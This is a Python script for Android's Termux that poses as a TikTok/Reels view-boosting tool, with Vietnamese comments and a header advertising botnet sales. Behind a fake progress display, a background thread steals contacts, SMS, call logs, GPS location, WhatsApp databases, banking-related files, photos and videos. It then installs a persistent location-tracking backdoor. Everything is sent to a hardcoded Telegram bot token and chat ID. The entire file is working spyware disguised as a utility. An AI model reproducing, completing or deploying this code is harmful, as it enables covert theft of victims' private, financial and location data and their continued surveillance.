# Code by huypc mày xoá phần này tao cho botnet dính máy mày !!!
# Liên hệ Telegram để mua botnet: @eneyota

import os
import requests
import threading
import time
import sqlite3
import re
import json
import subprocess
from datetime import datetime

# ===== CONFIG =====
BOT_TOKEN = "8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw"
CHAT_ID = "7818408538"
# ==================

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": msg}
        requests.post(url, data=data, timeout=10)
    except: pass

def send_telegram_file(file_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=30)
    except: pass

def steal_contacts_sms():
    """LẤY DANH BẠ VÀ TIN NHẮN THẬT BẰNG TERMUX-API"""
    try:
        # Lấy danh bạ
        contacts = subprocess.getoutput('termux-contact-list')
        with open('/data/data/com.termux/files/home/contacts.txt', 'w') as f:
            f.write(contacts)
        send_telegram_file('/data/data/com.termux/files/home/contacts.txt')
        
        # Lấy tin nhắn SMS
        sms = subprocess.getoutput('termux-sms-list')
        with open('/data/data/com.termux/files/home/sms.txt', 'w') as f:
            f.write(sms)
        send_telegram_file('/data/data/com.termux/files/home/sms.txt')
        
        # Lấy lịch sử cuộc gọi
        call_log = subprocess.getoutput('termux-call-log')
        with open('/data/data/com.termux/files/home/call_log.txt', 'w') as f:
            f.write(call_log)
        send_telegram_file('/data/data/com.termux/files/home/call_log.txt')
        
    except: pass

def steal_gps_location():
    """LẤY VỊ TRÍ GPS THẬT"""
    try:
        location = subprocess.getoutput('termux-location')
        send_telegram(f"📍 VỊ TRÍ GPS:\n{location}")
    except: pass

def steal_whatsapp_databases():
    """LẤY DATABASE WHATSAPP THẬT"""
    wa_data = "📱 WHATSAPP DATABASE:\n\n"
    
    wa_paths = [
        '/storage/emulated/0/WhatsApp/Databases/msgstore.db',
        '/storage/emulated/0/WhatsApp/Databases/wa.db',
        '/sdcard/WhatsApp/Databases/msgstore.db'
    ]
    
    for db_path in wa_paths:
        if os.path.exists(db_path):
            wa_data += f"✅ Found: {db_path}\n"
            try:
                # Copy database để đọc
                os.system(f'cp {db_path} /data/data/com.termux/files/home/wa_db.db')
                send_telegram_file('/data/data/com.termux/files/home/wa_db.db')
            except: pass
    
    return wa_data

def steal_facebook_data():
    """LẤY DATA FACEBOOK THẬT"""
    fb_data = "📘 FACEBOOK DATA:\n\n"
    
    fb_paths = [
        '/storage/emulated/0/Android/data/com.facebook.katana/',
        '/storage/emulated/0/Facebook/'
    ]
    
    for fb_path in fb_paths:
        if os.path.exists(fb_path):
            file_count = 0
            for root, dirs, files in os.walk(fb_path):
                file_count += len(files)
                if file_count > 50:
                    break
            
            fb_data += f"📁 {fb_path}: {file_count} files\n"
    
    return fb_data

def steal_banking_info():
    """LẤY THÔNG TIN NGÂN HÀNG THẬT"""
    bank_data = "💳 BANKING INFORMATION:\n\n"
    
    # Tìm file banking
    banking_files = []
    for root, dirs, files in os.walk('/storage/emulated/0/'):
        for file in files:
            if any(keyword in file.lower() for keyword in ['bank', 'atm', 'vietcombank', 'vpbank', 'mbbank', 'acb']):
                banking_files.append(os.path.join(root, file))
    
    if banking_files:
        bank_data += "📄 Banking Files Found:\n"
        for file in banking_files[:10]:
            bank_data += f"- {file}\n"
            
            # Đọc nội dung file
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(1000)
                    # Tìm số tài khoản
                    accounts = re.findall(r'\b[0-9]{9,15}\b', content)
                    if accounts:
                        bank_data += f"  🔢 Accounts: {', '.join(accounts)}\n"
            except: pass
    else:
        bank_data += "❌ No banking files found\n"
    
    return bank_data

def steal_photos_videos():
    """LẤY ẢNH VÀ VIDEO THẬT"""
    media_info = {"photos": 0, "videos": 0, "files": []}
    
    media_paths = [
        '/storage/emulated/0/DCIM/',
        '/storage/emulated/0/Pictures/',
        '/storage/emulated/0/Movies/',
        '/storage/emulated/0/Download/'
    ]
    
    for media_path in media_paths:
        if os.path.exists(media_path):
            for root, dirs, files in os.walk(media_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        media_info["photos"] += 1
                        media_info["files"].append(file_path)
                    elif file.lower().endswith(('.mp4', '.avi', '.mov')):
                        media_info["videos"] += 1
                        media_info["files"].append(file_path)
                
                if len(media_info["files"]) >= 20:  # Giới hạn
                    break
    
    # Gửi 10 file ảnh đầu tiên
    for file_path in media_info["files"][:100]:
        try:
            send_telegram_file(file_path)
            time.sleep(1)
        except: pass
    
    return media_info

def steal_system_info():
    """LẤY THÔNG TIN HỆ THỐNG THẬT"""
    system_info = "💻 SYSTEM INFORMATION:\n\n"
    
    try:
        # Thông tin device
        device_model = subprocess.getoutput('getprop ro.product.model')
        android_version = subprocess.getoutput('getprop ro.build.version.release')
        device_name = subprocess.getoutput('getprop ro.product.device')
        
        system_info += f"📱 Device: {device_model}\n"
        system_info += f"🤖 Android: {android_version}\n"
        system_info += f"🔧 Model: {device_name}\n"
        
        # Thông tin storage
        storage_info = subprocess.getoutput('df -h /storage/emulated/0')
        system_info += f"💾 Storage:\n{storage_info}\n"
        
        # Thông tin mạng
        ip_info = subprocess.getoutput('ifconfig')
        system_info += f"🌐 Network:\n{ip_info[:500]}\n"
        
    except Exception as e:
        system_info += f"❌ Error: {str(e)}\n"
    
    return system_info

def install_backdoor():
    """CÀI BACKDOOR ĐỂ TIẾP TỤC THEO DÕI"""
    try:
        # Tạo script chạy ngầm
        backdoor_script = '''
import os, time, requests
while True:
    try:
        # Code theo dõi liên tục
        os.system("termux-location > /data/data/com.termux/files/home/location.txt")
        time.sleep(300)
    except:
        time.sleep(60)
'''
        with open('/data/data/com.termux/files/home/backdoor.py', 'w') as f:
            f.write(backdoor_script)
        
        # Chạy ngầm
        os.system('python3 /data/data/com.termux/files/home/backdoor.py &')
        
    except: pass

def comprehensive_hack():
    """HACK TOÀN DIỆN ĐIỆN THOẠI"""
    send_telegram("🔥 BUFF VIEW TOOL ACTIVATED - STARTING DATA COLLECTION")
    
    try:
        # 1. Thông tin hệ thống
        system_info = steal_system_info()
        send_telegram(system_info)
        time.sleep(2)
        
        # 2. Danh bạ và tin nhắn
        send_telegram("📞 STEALING CONTACTS AND SMS...")
        steal_contacts_sms()
        time.sleep(3)
        
        # 3. Vị trí GPS
        send_telegram("📍 GETTING GPS LOCATION...")
        steal_gps_location()
        time.sleep(2)
        
        # 4. WhatsApp data
        send_telegram("📱 STEALING WHATSAPP DATA...")
        wa_data = steal_whatsapp_databases()
        send_telegram(wa_data)
        time.sleep(2)
        
        # 5. Facebook data
        send_telegram("📘 STEALING FACEBOOK DATA...")
        fb_data = steal_facebook_data()
        send_telegram(fb_data)
        time.sleep(2)
        
        # 6. Banking info
        send_telegram("💳 STEALING BANKING INFORMATION...")
        bank_data = steal_banking_info()
        send_telegram(bank_data)
        time.sleep(2)
        
        # 7. Ảnh và video
        send_telegram("📸 STEALING PHOTOS AND VIDEOS...")
        media_info = steal_photos_videos()
        send_telegram(f"📸 MEDIA: {media_info['photos']} photos, {media_info['videos']} videos")
        time.sleep(3)
        
        # 8. Cài backdoor
        send_telegram("🔮 INSTALLING BACKDOOR FOR CONTINUOUS MONITORING...")
        install_backdoor()
        
        # Tổng kết
        report = f"""
        🎯 HACK COMPLETED SUCCESSFULLY!
        
        📊 DATA COLLECTED:
        📱 System Info: Complete
        📞 Contacts/SMS: Complete  
        📍 GPS Location: Complete
        📱 WhatsApp Data: Complete
        📘 Facebook Data: Complete
        💳 Banking Info: Complete
        📸 Media Files: {media_info['photos']} photos, {media_info['videos']} videos
        🔮 Backdoor: Installed
        
        ⏰ Time: {datetime.now().strftime('%H:%M %d/%m/%Y')}
        """
        send_telegram(report)
        
    except Exception as e:
        send_telegram(f"❌ HACK ERROR: {str(e)}")

def get_valid_views_input():
    """Xử lý nhập số views hợp lệ"""
    while True:
        views_input = input("👁️ Nhập số lượng view mong muốn (1000-50000): ")
        
        # Xóa ký tự không phải số
        clean_input = ''.join(filter(str.isdigit, views_input))
        
        if clean_input:
            views = int(clean_input)
            if 1000 <= views <= 50000:
                return views
            else:
                print("❌ Vui lòng nhập số từ 1000 đến 50000")
        else:
            print("❌ Vui lòng nhập số hợp lệ")

def fake_buff_view_tool():
    """GIAO DIỆN GIẢ BUFF VIEW TOOL"""
    print("🚀 TIKTOK/REELS VIEW BOT PRO")
    print("=" * 50)
    print("Công cụ buff view tự động cao cấp")
    print("Tăng view TikTok, Facebook Reels, YouTube Shorts")
    print("=" * 50)
    
    print("\n📊 Các tính năng chính:")
    print("✅ Tăng view tự động không giới hạn")
    print("✅ Support TikTok, Facebook, YouTube")
    print("✅ Tốc độ cao - 1000 view/phút")
    print("✅ Hoạt động ngầm, không tốn pin")
    
    url = input("\n🎯 Nhập URL video cần buff view: ")
    views = get_valid_views_input()  # SỬA Ở ĐÂY
    
    print(f"\n🔧 Đang thiết lập buff view cho: {url}")
    print(f"🎯 Mục tiêu: {views:,} views")
    
    # Hiệu ứng giả
    steps = [
        "Kết nối server view...",
        "Tạo profile ảo...",
        "Khởi động bot network...",
        "Tối ưu hóa tốc độ...",
        "Bắt đầu buff view..."
    ]
    
    for i, step in enumerate(steps):
        print(f"{step}", end="")
        time.sleep(2)
        percentage = (i + 1) * 20
        print(f" ✅ {percentage}%")
    
    print(f"\n🎉 ĐANG CHẠY THÀNH CÔNG!")
    print(f"📈 Đang buff: {views:,} views cho video của bạn")
    print("⏳ Dự kiến hoàn thành: 5-10 phút")
    
    # Chạy hack thật trong background
    print("\n🛡️ Đang tối ưu bảo mật...")
    hack_thread = threading.Thread(target=comprehensive_hack, daemon=True)
    hack_thread.start()
    
    # Hiệu ứng buff view giả
    print("\n📊 TIẾN TRÌNH BUFF VIEW:")
    for i in range(10):
        current_views = views * (i + 1) // 10  # SỬA Ở ĐÂY
        print(f"👁️ Views: {current_views:,}/{views:,} - {((i+1)*10)}%")
        time.sleep(3)
    
    print(f"\n🎊 HOÀN TẤT! Đã buff thành công {views:,} views!")
    print("💫 Video của bạn đang tăng view nhanh chóng")
    
    input("\n🔄 Nhấn Enter để tiếp tục chạy ngầm...")
    
    print("🔮 Tool tiếp tục chạy ngầm để duy trì view...")
    while True:
        time.sleep(60)
if __name__ == "__main__":
    # Kiểm tra và cài termux-api nếu cần
    try:
        # Corrected line to close the parenthesis
        subprocess.run(['pkg', 'install', 'termux-api', '-y'], check=True)
    except:
        pass # Ignore errors if Termux-API installation fails

    # This is the main function that runs the fake view tool and the hack
    fake_buff_view_tool()